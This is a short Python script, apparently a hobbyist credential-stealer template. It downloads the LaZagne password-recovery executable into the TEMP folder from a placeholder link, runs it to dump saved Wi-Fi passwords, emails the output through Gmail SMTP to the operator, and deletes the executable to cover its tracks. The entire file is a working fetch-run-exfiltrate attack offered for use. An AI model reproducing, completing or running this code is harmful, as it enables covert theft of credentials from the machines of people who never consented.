import requests
import subprocess
import smtplib
import os
import tempfile
import re

def send_mail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

def download(url):
    request = requests.get(url)
    # file_name = url.split("/")
    # print(file_name[-1])
    with open("lazagne.exe","wb") as out_file: #downloading file with the name as binary file
        out_file.write(request.content) 


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)  #this saves the downloaded program to TEMP directory
download("provide link to lazange through local server or dropbox") #provide link to program here
command = subprocess.check_output("lazagne.exe wifi") #command for lazange to run
send_mail("email","passowrd",command) #provide your email and password
os.remove("lazagne.exe")
